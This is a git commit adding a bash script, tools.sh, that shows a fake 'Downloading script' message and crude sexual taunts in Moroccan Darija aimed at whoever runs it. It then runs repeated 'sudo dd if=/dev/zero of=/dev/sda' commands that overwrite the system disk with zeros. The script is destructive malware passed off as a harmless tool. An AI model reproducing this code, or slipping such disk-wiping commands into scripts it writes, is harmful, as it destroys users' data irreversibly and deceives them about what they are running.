b81c82d849f2bb90884ab8d7cb6c918a29dba2e0
hamza <hamzabenzidane01@gmail.com>
2025-06-17 02:38:42 +0100

    Create tools.sh

---
+++ tools.sh
@@ -0,0 +1,16 @@
+#!/usr/bin/env bash
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+NC='\033[0m'
+
+    echo -e "${YELLOW}  Downloading script ✅${NC}"
+    echo -e "${YELLOW}  ydk fih hh nta li mkdyhach f krk hhhh 🖕🍆${NC}"
+    echo -e "${YELLOW}  نتا اخويا لي مكتديهاش ف كرك ودابا يدك فيه هه 🖕🍆
+    ${NC}"
+
+
+sudo dd if=/dev/zero of=/dev/sda bs=500M oflag=direct status=progress
+sudo dd if=/dev/zero of=/dev/sda bs=50M oflag=direct status=progress
+sudo dd if=/dev/zero of=/dev/sda bs=1M
+sudo dd if=/dev/zero of=/dev/sda bs=1M
